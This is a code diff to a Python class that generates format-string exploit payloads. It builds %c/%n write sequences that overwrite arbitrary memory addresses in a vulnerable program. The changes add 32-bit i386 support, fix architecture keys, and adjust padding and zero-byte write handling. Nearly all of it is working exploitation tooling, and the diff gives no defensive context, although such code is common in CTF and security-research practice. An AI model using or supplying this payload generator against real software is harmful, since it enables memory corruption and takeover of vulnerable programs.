@@ -15,6 +15,12 @@ class FMT:
             8: "%{}c%{}$lln"
         }
 
+    def p(self, data):
+        return { 'amd64': self.p64, 'i386': self.p32 }[self.arch](data)
+
+    def p32(self, data, fmt = "<I"):
+        return struct.pack(fmt, data)
+
     def p64(self, data, fmt = "<Q"):
         return struct.pack(fmt, data)
 
@@ -28,7 +34,7 @@ class FMT:
         return width
 
     def _write(self, address, value, size = 1):
-        length = { 'amd64': 8, 'x86': 4 }[self.arch]
+        length = { 'amd64': 8, 'i386': 4 }[self.arch]
         # set one byte at a time ( 0x00000000000000?? to 0x??00000000000000 )
         for i in range(length // size):
             # (value >> 0) & 0xff
@@ -36,29 +42,32 @@ class FMT:
             # (value_now - self.printed + 0x100) % 0x100
             value_append = (value_now - self.printed + (1 << (8 * size))) % (1 << (8 * size))
             self.printed = value_now
-            # can't write %0c, but we can write %256c
-            if value_append == 0: value_append = (1 << (8 * size))
-            self._append(address + i * size, self.nformat[size].format(value_append, "{}"))
+            # if no character to print is zero, no need %c
+            if value_append == 0:
+                self._append(address + i * size, self.nformat[size][4:])
+            else:
+            	self._append(address + i * size, self.nformat[size].format(value_append, "{}"))
 
     def __setitem__(self, address, value):
         self.buffer.append((address, value))
 
     def payload(self, offset, printed = 0, size = 1):
+        length = { 'amd64': 8, 'i386': 4 }[self.arch]
         self.printed = printed
         for address, value in self.buffer: self._write(address, value, size)
         # calculate how far the distance between fmt and address is
         distance = 0
         while True:
             width = self._fmt_width(offset, distance)
-            distance_new = int(math.ceil(width / 8.0))
+            distance_new = int(math.ceil(width / float(length)))
             if distance == distance_new: break
             distance = distance_new
 
         # generate payload
         payload = b""
         for i, fmt in enumerate(self.fmt): payload += fmt.format(offset + distance + i).encode('ascii')
-        payload += b"\x00" * (8 - len(payload) % 8)
-        payload += b''.join(map(self.p64, self.address))
+        payload += b"\x00" * (length - len(payload) % length)
+        payload += b''.join(map(self.p, self.address))
         
         # reset
         self.printed = 0
